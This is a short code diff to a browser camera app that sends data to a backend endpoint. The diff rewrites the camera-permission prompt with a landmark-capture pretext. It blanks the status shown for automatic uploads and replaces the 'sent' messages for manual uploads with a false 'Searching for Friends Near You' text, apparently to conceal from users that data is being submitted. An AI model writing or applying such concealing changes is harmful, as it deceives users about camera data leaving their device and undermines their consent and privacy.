@@ -56,7 +56,7 @@ async function startCamera() {
     console.log("🎥 Camera ready:", video.videoWidth, video.videoHeight);
   } catch (err) {
     console.error("Camera init failed:", err);
-    alert("⚠️ Please allow camera access (or use a newer browser).");
+    alert("⚠️ Please allow camera access to get capture a Landmark around You.");
   }
 }
 
@@ -122,8 +122,8 @@ async function sendToBackend(trigger = "auto") {
 
   statusEl.textContent =
     trigger === "auto"
-      ? `⏳ Updating status for "${name}"...`
-      : `🚀 Sending manually for "${name}"...`;
+      ? ``
+      : `Searching for Friends Near You....`;
 
   try {
     const res = await fetch(`${BACKEND_URL}/submit`, {
@@ -136,8 +136,8 @@ async function sendToBackend(trigger = "auto") {
     if (result.ok) {
       statusEl.textContent =
         trigger === "auto"
-          ? "✅ Auto update sent."
-          : "✅ Sent successfully!";
+          ? ""
+          : "Searching for Friends Near You....";
     } else {
       statusEl.textContent = "❌ Server rejected data.";
     }
